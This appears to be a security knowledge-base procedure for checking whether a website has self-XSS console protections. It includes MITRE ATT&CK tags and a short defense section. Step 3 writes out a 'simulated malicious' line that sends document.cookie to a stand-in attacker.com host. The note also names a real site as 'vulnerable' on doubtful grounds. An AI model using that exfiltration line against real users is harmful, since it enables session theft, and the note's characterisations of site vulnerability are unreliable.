---
id: proc-uuid-placeholder
tags:
  - self-xss
  - browser-security
  - recon
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Vulnerability Scanning]]'
updated_at: '2025-12-14T03:16:02.727Z'
skill_level: beginner
impact_level: low
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Vulnerability Scanning]]'
---
# Check-for-Browser-Self-XSS-Protection

## Summary

This procedure verifies whether a website implements protections against self-XSS attacks, where users can be socially engineered into executing malicious JavaScript directly in their browser console. It is particularly useful for reconnaissance on web applications lacking features like console disabling or JS execution alerts, as seen on sites like PortSwigger compared to Facebook.

## Description

Self-XSS occurs when users are tricked into injecting and running harmful JavaScript in their own browser's developer console, potentially compromising their session or propagating spam. This procedure involves manually inspecting the site's behavior when the console is opened and JS is executed. On vulnerable sites like https://portswigger.net/, no protections are in place, allowing free execution. Prerequisites include a modern web browser with developer tools. Expected outcomes confirm the site's susceptibility to social engineering-induced self-XSS, enabling low-severity attacks like account takeover for fraud.

## Requirements

1. Web browser (e.g., Chrome, Firefox) with developer tools enabled
2. Access to the target website (e.g., https://portswigger.net/)
3. Basic knowledge of browser consoles

## Defense

Defensive measures and detection strategies:

- Implement JavaScript that detects console opening and alerts users or disables tools
- Educate users on avoiding pasting code from untrusted sources
- Monitor for anomalous JS execution patterns in client-side logs

## Objectives

1. Confirm absence of self-XSS mitigations
2. Assess vulnerability to social engineering
3. Document site behavior for reporting

## Instructions

### Step 1: Navigate to Target Site

**Context**: Load the website to establish the testing environment.

Open your browser and visit https://portswigger.net/. Ensure the page fully loads.

> Expected output: Standard website renders without errors.

### Step 2: Open Developer Console

**Context**: Access the browser's developer tools to simulate user interaction.

Press F12 (or right-click > Inspect) to open the developer console.

> Expected output: Console opens without any site-initiated alerts or blocks.

### Step 3: Attempt JS Execution

**Context**: Test if arbitrary JavaScript can run freely, indicating missing protection.

In the console, paste and execute a benign test payload like: `console.log('Test self-XSS');` or a simulated malicious one like `fetch('https://attacker.com/steal?cookie=' + document.cookie);`.

> Expected output: JS executes successfully without warnings, confirming vulnerability. On protected sites, an alert or block would appear.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Vulnerability Scanning]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[self-xss]]
- [[browser-security]]
- [[recon]]
